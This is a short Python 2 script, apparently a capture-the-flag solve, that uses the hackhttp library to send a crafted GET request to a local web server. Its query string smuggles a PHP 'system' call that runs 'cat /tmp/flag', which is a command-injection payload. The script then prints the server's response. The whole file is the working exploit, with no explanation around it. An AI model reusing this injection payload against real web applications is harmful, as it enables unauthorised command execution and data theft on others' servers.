#!/usr/bin/env python
# coding:utf-8
import hackhttp
hh = hackhttp.hackhttp()
raw = '''GET /?0=huasir&1=system(%27cat%20/tmp/flag%27); HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1'''

code, head, html, redirect, log = hh.http('http://127.0.0.1/?0=huasir&1=system(%27cat%20/tmp/flag%27);', raw=raw)

print html
for i in log:
    print i
    print log[i]

